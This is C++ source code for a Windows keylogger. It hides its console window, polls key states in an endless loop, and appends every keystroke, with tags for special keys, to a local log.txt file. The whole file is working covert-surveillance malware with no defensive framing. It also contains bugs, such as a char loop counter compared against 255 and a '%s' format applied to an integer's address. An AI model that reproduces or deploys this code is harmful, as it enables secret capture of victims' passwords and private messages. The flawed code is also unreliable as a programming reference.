#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);

int main()
{

    FreeConsole();

    char i;

    while (true)
    {
        Sleep(10);
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file)
{

    cout << _key << endl;

    Sleep(10);

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");

    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (_key == VK_NUMPAD0)
        fprintf(OUTPUT_FILE, "%s", "[num0]");
    else if (_key == VK_NUMPAD1)
        fprintf(OUTPUT_FILE, "%s", "[num1]");
    else if (_key == VK_NUMPAD2)
        fprintf(OUTPUT_FILE, "%s", "[num2]");
    else if (_key == VK_NUMPAD3)
        fprintf(OUTPUT_FILE, "%s", "[num3]");
    else if (_key == VK_NUMPAD4)
        fprintf(OUTPUT_FILE, "%s", "[num4]");
    else if (_key == VK_NUMPAD5)
        fprintf(OUTPUT_FILE, "%s", "[num5]");
    else if (_key == VK_NUMPAD6)
        fprintf(OUTPUT_FILE, "%s", "[num6]");
    else if (_key == VK_NUMPAD7)
        fprintf(OUTPUT_FILE, "%s", "[num7]");
    else if (_key == VK_NUMPAD8)
        fprintf(OUTPUT_FILE, "%s", "[num8]");
    else if (_key == VK_NUMPAD9)
        fprintf(OUTPUT_FILE, "%s", "[num9]");          
    else
        fprintf(OUTPUT_FILE, "%s", &_key);

    fclose(OUTPUT_FILE);

    return 0;
}
